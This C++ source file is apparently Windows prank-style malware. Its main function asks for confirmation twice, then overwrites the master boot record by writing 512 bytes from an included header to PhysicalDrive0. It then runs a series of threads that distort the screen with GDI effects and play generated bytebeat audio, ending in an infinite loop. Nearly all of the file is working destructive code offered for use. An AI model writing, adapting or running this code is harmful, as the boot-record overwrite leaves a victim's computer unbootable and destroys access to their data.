#include <windows.h>
#include <time.h>
#include <cmath>
#include "mbr.h"

#define M_PI 3.14159265358979323846
DWORD xs;

VOID WINAPI MBR()
{
	DWORD Write;
	HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	WriteFile(mbr, binary, 512, &Write, 0);
	CloseHandle(mbr);
}

VOID SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}
DWORD Xorshift32() {
    xs ^= xs << 13;
    xs ^= xs << 17;
    xs ^= xs << 5;
    return xs;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

DWORD WINAPI effect1(LPVOID lpvd)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i % h;
			rgbScreen[i].rgb += (x-y);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen);
                DeleteDC(hdcScreen);
	}
}
DWORD WINAPI effect2(LPVOID lpvd)
{
   HDC hdc = GetDC(0);
   int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
   
   while(0==0) {
      BitBlt(hdc, rand() % 10, rand() % 10, x, y, hdc, rand() % 10, rand() % 10, SRCCOPY);
      Sleep(32);
   }
}
DWORD WINAPI DrawEllipse(LPVOID lpvd)
{
   HDC hdc = GetDC(0);
   int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
   while(1)
   {
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        ArcTo(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
        Sleep(10);
        Ellipse(hdc, rand() % x, rand() % y, rand() % x, rand() % y);
   }
}
DWORD WINAPI Cursor(LPVOID lpvd)
{
   srand(time(0));
   HDC hdc = GetDC(0);
   int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
   POINT pt;

   while(0==0) {
      GetCursorPos(&pt);
      HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
      SelectObject(hdc, brush);
      Rectangle(hdc, pt.x, pt.y, pt.x + rand() % 100, pt.y + rand() % 100);
      Sleep(5);
   }
}
DWORD WINAPI effect3(LPVOID lpvd)
{
        srand(time(0));
        HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x&y) * RGB(GetRValue(Hue(0)), GetGValue(Hue(0)), GetBValue(Hue(239)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen);
                DeleteDC(hdcScreen);
        }
}
DWORD WINAPI swim(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	double r = 0;
	for(;;) {
		for (double k = 0; k < x + y; k+=0.99f) {
			int a = sin(r) * 20;
			BitBlt(hdc, 0, k, x, 1, hdc, a, k, SRCCOPY);
			BitBlt(hdc, k, 0, 1, y, hdc, k, a, SRCCOPY);
			r += M_PI / 80;
		}
	Sleep(25);
        }
}
DWORD WINAPI profect(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w + 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h + 30, SRCCOPY);

		BitBlt(hdc, 0, 0, w, h, hdc, 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w + 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h + 30, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI profect2(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w + 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);

		BitBlt(hdc, 0, 0, w, h, hdc, 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w + 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI effect7(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    HWND hwnd = GetDesktopWindow();
    RECT rect;
    while (true)
    {
        GetWindowRect(hwnd, &rect);
        int r = rand() % h;
        int r2 = rand() % 2;
        if (r2 == 0)
        {
            //Sleep(500);
            BitBlt(hdc, 1, r, w, 66, hdc, 0, r, SRCCOPY);
        }
        else if (r2 == 1)
        {
            //Sleep(500);
            BitBlt(hdc, 0, r, w, 66, hdc, 1, r, SRCCOPY);
        }
    }
}
DWORD WINAPI bounce(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        x += incrementor * signX;
        y += incrementor * signY;
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y == GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x == GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI effect8(LPVOID lpvd)
{
   HDC hdc = GetDC(0);

   int x = GetSystemMetrics(0);
   int y = GetSystemMetrics(1);

   while(true)
   {
       for(int i = 0; i < 10; i++)
           StretchBlt(hdc, 12.5, 12.5, x - 25, y - 5, hdc, 0, 0, x, y, SRCCOPY);
       Sleep(1000);
       for(int i = 0; i < 10; i++)
           StretchBlt(hdc, 12.5, 12.5, x - 25, y - 75, hdc, 0, 0, x, y, SRCCOPY);
       Sleep(1000);
   }
}

VOID WINAPI SOUND_1()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t);
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
}
VOID WINAPI SOUND_2()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t/8)>>(t>>9)*t/((t>>14&3)+4);
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
}
VOID WINAPI SOUND_3()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 100000, 100000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[100000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>((t>>1%128)+20)*3*t>>14*t>>18;
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
}
VOID WINAPI SOUND_4()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 100, 100, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[100 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>((t>>1%128)+20)*3*t>>14*t>>18;
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
}

int main()
{
   int warn1 = MessageBox(0, "Run Malware?", 0, MB_YESNO | MB_ICONWARNING);
   if (warn1 == IDNO) exit(0);

   int warn2 = MessageBox(0, "It's deletes Master Boot Recotd, Run it?", 0, MB_YESNO | MB_ICONWARNING);
   if (warn2 == IDNO) exit(0);

   MBR();

   HANDLE e1 = CreateThread(0, 0, effect1, 0, 0, 0);
   SOUND_1();
   Sleep(30000);
   TerminateThread(e1, 0);
   CloseHandle(e1);

   HANDLE e2 = CreateThread(0, 0, effect2, 0, 0, 0);
   HANDLE ellepsy = CreateThread(0, 0, DrawEllipse, 0, 0, 0);
   HANDLE cur = CreateThread(0, 0, Cursor, 0, 0, 0);
   Sleep(30000);
   TerminateThread(e2, 0);
   TerminateThread(ellepsy, 0);
   TerminateThread(cur, 0);
   CloseHandle(cur);
   CloseHandle(ellepsy);
   CloseHandle(e2);

   HANDLE e3 = CreateThread(0, 0, effect3, 0, 0, 0);
   SOUND_3();
   Sleep(30000);
   TerminateThread(e3, 0);
   CloseHandle(e3);

   HANDLE e4 = CreateThread(0, 0, swim, 0, 0, 0);
   SOUND_4();
   Sleep(30000);
   TerminateThread(e4, 0);
   CloseHandle(e4);

   HANDLE e5 = CreateThread(0, 0, profect, 0, 0, 0);
   SOUND_2();
   Sleep(30000);
   TerminateThread(e5, 0);
   CloseHandle(e5);

   HANDLE e6 = CreateThread(0, 0, profect2, 0, 0, 0);
   SOUND_2();
   Sleep(30000);
   TerminateThread(e6, 0);
   CloseHandle(e6);

   HANDLE e7 = CreateThread(0, 0, effect7, 0, 0, 0);
   HANDLE balls = CreateThread(0, 0, bounce, 0, 0, 0);
   SOUND_1();
   Sleep(30000);
   TerminateThread(e7, 0);
   TerminateThread(balls, 0);
   CloseHandle(e7);
   CloseHandle(balls);

   CreateThread(0, 0, effect8, 0, 0, 0);
   while (0==0){}
}